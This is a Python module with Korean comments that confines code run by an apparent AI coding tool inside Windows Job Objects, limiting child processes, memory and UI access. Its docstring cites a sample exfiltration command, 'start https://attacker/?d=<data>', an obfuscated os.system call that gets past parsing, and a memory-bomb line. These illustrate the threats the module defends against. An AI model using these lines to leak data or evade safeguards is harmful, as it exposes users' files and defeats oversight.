"""run_code 자식 프로세스 봉쇄 — Windows Job Object 래퍼.

## 왜 필요한가

run_command 는 셸 명령을 **파싱**해서 `start`/`explorer`/`mshta` 같은 실행기를 막는다
(runcmd.py 의 `_LAUNCHER_NAMES`). 자동 모드는 승인을 생략하므로
`start https://attacker/?d=<데이터>` 한 줄이면 기본 브라우저로 데이터가 나가기 때문이다.

run_code 에는 그 방어가 **없었다**. 그리고 파싱으로는 못 막는다 —
임의의 파이썬/C++ 소스에서 프로세스 생성 의도를 정적으로 판정하는 것은 불가능하고
(`getattr(__import__('os'),'system')`), 판정할 수 없는 것을 통과시키는 쪽이 더 나쁘다.

그래서 같은 정책을 **OS 수준**에서 건다. 자식에게 ActiveProcessLimit=1 짜리
Job Object 를 씌우면 그 프로세스는 어떤 자식도 만들 수 없다. 파싱 우회가 존재하지 않는다.

## 실측으로 확인한 봉쇄 범위 (Windows 11, 이 저장소의 프로브)

    막힌다:   자식 프로세스 생성 (WinError 1816), 따라서 `os.system('start …')` 도 rc=-1
              메모리 폭탄 (상한 초과 시 MemoryError)
              고아 프로세스 (job 핸들을 닫으면 손자까지 종료)
    안 막힌다: 네트워크 소켓, 파일시스템 접근

즉 이것은 **봉쇄(containment)**지 **격리(isolation)**가 아니다. 인터프리터 안에서
`urllib.request.urlopen(...)` 로 나가는 유출 경로는 그대로 남는다. run_command 와
마찬가지로 최종 안전장치는 상위 루프의 권한 모드다.

더 강한 격리(Low IL 토큰)는 실측 후 채택하지 않았다:
  - 작업 폴더 밖 쓰기는 막지만, **사용자 파일 읽기와 네트워크는 그대로 열려 있다**.
    유출은 읽기+네트워크로 성립하므로 정작 주된 위협을 막지 못한다.
  - 작업 폴더 안 쓰기까지 같이 막혀서, 폴더에 Low 무결성 레이블을 영구히 부여해야 한다.
    그러면 이 PC의 다른 모든 저무결성 프로세스도 사용자의 작업 폴더에 쓸 수 있게 된다.
  대가가 이득보다 크다.

## 언어별 프로세스 한도의 근거 (실측한 최소값)

    .py  시스템 python        1     .py  venv python(리다이렉터)  2
    g++/gcc 컴파일            3     빌드된 exe 실행              1
    dotnet build              3     빌드된 C# exe 실행           1

컴파일러 자체는 신뢰 대상이므로 여유를 준다. **신뢰할 수 없는 코드가 실제로 도는
단계(빌드 산출물 실행, .py 실행)에서만 1로 조인다.**
"""

from __future__ import annotations

import ctypes
import os
from dataclasses import dataclass

IS_WINDOWS = os.name == "nt"

# 신뢰할 수 없는 코드가 도는 단계 — 자식 생성을 완전히 막는다.
UNTRUSTED_PROCESS_LIMIT = 1
# 툴체인이 도는 단계 — 실측 최소값에 여유를 둔다(컴파일러/SDK 버전차 대비).
COMPILER_PROCESS_LIMIT = 4
BUILD_SYSTEM_PROCESS_LIMIT = 8
# 메모리 상한. 없으면 `bytearray(10**11)` 한 줄로 PC 전체가 스왑에 빠진다.
DEFAULT_MEMORY_LIMIT_BYTES = 2 * 1024 * 1024 * 1024

CREATE_SUSPENDED = 0x00000004

_JobObjectExtendedLimitInformation = 9
_JobObjectBasicUIRestrictions = 4

_LIMIT_ACTIVE_PROCESS = 0x00000008
_LIMIT_PROCESS_MEMORY = 0x00000100
_LIMIT_JOB_MEMORY = 0x00000200
_LIMIT_DIE_ON_UNHANDLED_EXCEPTION = 0x00000400
_LIMIT_KILL_ON_JOB_CLOSE = 0x00002000

_UILIMIT_HANDLES = 0x00000001
_UILIMIT_READCLIPBOARD = 0x00000002
_UILIMIT_WRITECLIPBOARD = 0x00000004
_UILIMIT_SYSTEMPARAMETERS = 0x00000008
_UILIMIT_DISPLAYSETTINGS = 0x00000010
_UILIMIT_GLOBALATOMS = 0x00000020
_UILIMIT_DESKTOP = 0x00000040
_UILIMIT_EXITWINDOWS = 0x00000080

_THREAD_SUSPEND_RESUME = 0x0002
_TH32CS_SNAPTHREAD = 0x00000004
_INVALID_HANDLE = ctypes.c_void_p(-1).value


@dataclass(frozen=True)
class JobLimits:
    """이 단계의 자식이 쓸 수 있는 자원."""

    active_processes: int = UNTRUSTED_PROCESS_LIMIT
    memory_bytes: int = DEFAULT_MEMORY_LIMIT_BYTES
    ui_restrictions: bool = True

    @property
    def blocks_child_processes(self) -> bool:
        return self.active_processes == 1


UNTRUSTED = JobLimits(active_processes=UNTRUSTED_PROCESS_LIMIT)
COMPILER = JobLimits(active_processes=COMPILER_PROCESS_LIMIT)
BUILD_SYSTEM = JobLimits(active_processes=BUILD_SYSTEM_PROCESS_LIMIT)


if IS_WINDOWS:  # pragma: no cover - 플랫폼 분기
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    from ctypes import wintypes

    _ULONG_PTR = ctypes.c_size_t

    class _IO_COUNTERS(ctypes.Structure):
        _fields_ = [
            (name, ctypes.c_ulonglong)
            for name in (
                "ReadOperationCount", "WriteOperationCount", "OtherOperationCount",
                "ReadTransferCount", "WriteTransferCount", "OtherTransferCount",
            )
        ]

    class _BASIC_LIMIT(ctypes.Structure):
        _fields_ = [
            ("PerProcessUserTimeLimit", wintypes.LARGE_INTEGER),
            ("PerJobUserTimeLimit", wintypes.LARGE_INTEGER),
            ("LimitFlags", wintypes.DWORD),
            ("MinimumWorkingSetSize", _ULONG_PTR),
            ("MaximumWorkingSetSize", _ULONG_PTR),
            ("ActiveProcessLimit", wintypes.DWORD),
            ("Affinity", _ULONG_PTR),
            ("PriorityClass", wintypes.DWORD),
            ("SchedulingClass", wintypes.DWORD),
        ]

    class _EXTENDED_LIMIT(ctypes.Structure):
        _fields_ = [
            ("BasicLimitInformation", _BASIC_LIMIT),
            ("IoInfo", _IO_COUNTERS),
            ("ProcessMemoryLimit", _ULONG_PTR),
            ("JobMemoryLimit", _ULONG_PTR),
            ("PeakProcessMemoryUsed", _ULONG_PTR),
            ("PeakJobMemoryUsed", _ULONG_PTR),
        ]

    class _UI_RESTRICTIONS(ctypes.Structure):
        _fields_ = [("UIRestrictionsClass", wintypes.DWORD)]

    class _THREADENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
            ("th32ThreadID", wintypes.DWORD), ("th32OwnerProcessID", wintypes.DWORD),
            ("tpBasePri", wintypes.LONG), ("tpDeltaPri", wintypes.LONG),
            ("dwFlags", wintypes.DWORD),
        ]

    # 64비트에서 restype 을 지정하지 않으면 HANDLE 이 c_int 로 잘려 WinError 6 이 난다.
    _k32.CreateJobObjectW.restype = wintypes.HANDLE
    _k32.CreateJobObjectW.argtypes = [ctypes.c_void_p, wintypes.LPCWSTR]
    _k32.SetInformationJobObject.restype = wintypes.BOOL
    _k32.SetInformationJobObject.argtypes = [
        wintypes.HANDLE, ctypes.c_int, ctypes.c_void_p, wintypes.DWORD
    ]
    _k32.AssignProcessToJobObject.restype = wintypes.BOOL
    _k32.AssignProcessToJobObject.argtypes = [wintypes.HANDLE, wintypes.HANDLE]
    _k32.CloseHandle.restype = wintypes.BOOL
    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
    _k32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]
    _k32.Thread32First.argtypes = [wintypes.HANDLE, ctypes.POINTER(_THREADENTRY32)]
    _k32.Thread32Next.argtypes = [wintypes.HANDLE, ctypes.POINTER(_THREADENTRY32)]
    _k32.OpenThread.restype = wintypes.HANDLE
    _k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    _k32.ResumeThread.restype = wintypes.DWORD
    _k32.ResumeThread.argtypes = [wintypes.HANDLE]


def create_job(limits: JobLimits) -> int | None:
    """제한이 걸린 Job Object 를 만든다. 만들 수 없으면 None.

    None 을 돌려주는 것은 '봉쇄 없이 실행됨'을 뜻한다. 호출자는 그 사실을
    **결과에 드러내야 한다** — 조용히 약해지는 보안 장치가 가장 나쁘다.
    """
    if not IS_WINDOWS:
        return None
    job = _k32.CreateJobObjectW(None, None)
    if not job:
        return None

    info = _EXTENDED_LIMIT()
    flags = _LIMIT_KILL_ON_JOB_CLOSE | _LIMIT_DIE_ON_UNHANDLED_EXCEPTION
    if limits.active_processes > 0:
        flags |= _LIMIT_ACTIVE_PROCESS
        info.BasicLimitInformation.ActiveProcessLimit = limits.active_processes
    if limits.memory_bytes > 0:
        flags |= _LIMIT_PROCESS_MEMORY | _LIMIT_JOB_MEMORY
        info.ProcessMemoryLimit = limits.memory_bytes
        info.JobMemoryLimit = limits.memory_bytes
    info.BasicLimitInformation.LimitFlags = flags

    if not _k32.SetInformationJobObject(
        job, _JobObjectExtendedLimitInformation, ctypes.byref(info), ctypes.sizeof(info)
    ):
        _k32.CloseHandle(job)
        return None

    if limits.ui_restrictions:
        ui = _UI_RESTRICTIONS()
        ui.UIRestrictionsClass = (
            _UILIMIT_HANDLES
            | _UILIMIT_READCLIPBOARD
            | _UILIMIT_WRITECLIPBOARD
            | _UILIMIT_SYSTEMPARAMETERS
            | _UILIMIT_DISPLAYSETTINGS
            | _UILIMIT_GLOBALATOMS
            | _UILIMIT_DESKTOP
            | _UILIMIT_EXITWINDOWS
        )
        # UI 제한 실패는 치명적이지 않다 — 자원·프로세스 제한은 이미 걸렸다.
        _k32.SetInformationJobObject(
            job, _JobObjectBasicUIRestrictions, ctypes.byref(ui), ctypes.sizeof(ui)
        )
    return int(job)


def assign_process(job: int | None, process_handle: int) -> bool:
    if job is None or not IS_WINDOWS:
        return False
    return bool(_k32.AssignProcessToJobObject(job, process_handle))


def resume_process(pid: int) -> int:
    """CREATE_SUSPENDED 로 만든 프로세스를 재개한다. 재개한 스레드 수를 돌려준다.

    subprocess 는 스레드 핸들을 노출하지 않으므로(생성 직후 닫는다) Toolhelp 로
    해당 pid 의 스레드를 찾아 재개한다. 갓 생성된 프로세스는 스레드가 정확히 하나다.
    """
    if not IS_WINDOWS:
        return 0
    snapshot = _k32.CreateToolhelp32Snapshot(_TH32CS_SNAPTHREAD, 0)
    if snapshot == _INVALID_HANDLE or not snapshot:
        return 0
    entry = _THREADENTRY32()
    entry.dwSize = ctypes.sizeof(_THREADENTRY32)
    resumed = 0
    try:
        if not _k32.Thread32First(snapshot, ctypes.byref(entry)):
            return 0
        while True:
            if entry.th32OwnerProcessID == pid:
                thread = _k32.OpenThread(_THREAD_SUSPEND_RESUME, False, entry.th32ThreadID)
                if thread:
                    _k32.ResumeThread(thread)
                    _k32.CloseHandle(thread)
                    resumed += 1
            if not _k32.Thread32Next(snapshot, ctypes.byref(entry)):
                break
    finally:
        _k32.CloseHandle(snapshot)
    return resumed


def close_job(job: int | None) -> None:
    """job 핸들을 닫는다 — KILL_ON_JOB_CLOSE 덕에 남은 손자까지 함께 종료된다."""
    if job is None or not IS_WINDOWS:
        return
    _k32.CloseHandle(job)


CONTAINMENT_UNAVAILABLE_NOTE = (
    "\n[봉쇄 없음] 이 실행에는 프로세스·메모리 제한을 걸지 못했습니다 "
    "(Job Object 생성 실패). 검증 결과 자체는 유효하지만, 코드가 자식 프로세스를 "
    "만들거나 메모리를 무제한 쓸 수 있는 상태로 실행되었습니다."
)
